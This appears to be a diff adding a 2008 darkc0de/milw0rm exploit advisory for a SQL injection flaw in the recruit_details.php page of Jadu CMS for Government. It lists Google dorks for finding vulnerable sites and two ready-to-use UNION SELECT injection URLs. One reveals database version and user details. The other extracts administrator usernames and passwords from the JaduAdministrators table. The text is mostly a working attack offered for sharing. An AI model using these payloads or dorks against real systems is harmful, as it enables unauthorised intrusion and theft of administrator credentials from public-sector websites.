@@ -1,0 +1,57 @@
+################################################################ 
+#       .___             __          _______       .___        # 
+#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
+#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
+#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
+#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
+#        \/                  \/             \/                 # 
+#                   ___________   ______  _  __                # 
+#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
+#                 \  \___|  | \/\  ___/\     /                 # 
+#                  \___  >__|    \___  >\/\_/                  # 
+#      est.2007        \/            \/   forum.darkc0de.com   # 
+################################################################ 
+# --d3hydr8 -rsauron-baltazar -sinner_01 -C1c4Tr1Z -beenu- DON # 
+#-OutLawz- P47tr1ck- FeDeReR- MAGE- JeTFyrE-FunctionSys-jappan #              
+#                   and all darkc0de members                ---# 
+################################################################ 
+# 
+# Author: r45c4l (Special thanks to congrallion)
+# 
+# Home  : www.darkc0de.com 
+# 
+# Email : r45c4l@hotmail.com 
+# 
+# Share the c0de! 
+# 
+################################################################ 
+# 
+# Title: Jadu CMS for Government (recruit_details.php) Remote SQL Inj
+#
+#
+# Vendor: http://www.jadu.co.uk/site/index.php
+#
+# 
+#
+###########################################################
+#
+# d0rk:inurl:site/scripts/recruit_details.php?id
+# d0rk:inurl:"recruit_details.php?id=" 
+#
+###########################################################
+ 
+  POC 1: 
+
+	http://www.site.com/site/scripts/recruit_details.php?id=null+union+select+1,2,3,4,concat_ws(0x3a,version(),user(),database()),6,7,8,9,10,11,12--
+
+  POC 2:
+
+	http://www.site.com/site/scripts/recruit_details.php?id=null+union+select+1,2,3,4,concat(username,0x3a,password),6,7,8,9,10,11,12+from+JaduAdministrators--
+
+
+###########################################################
+#
+#  Bug discovered : 24 Sep.2008
+###########################################################
+
+# milw0rm.com [2008-09-24]
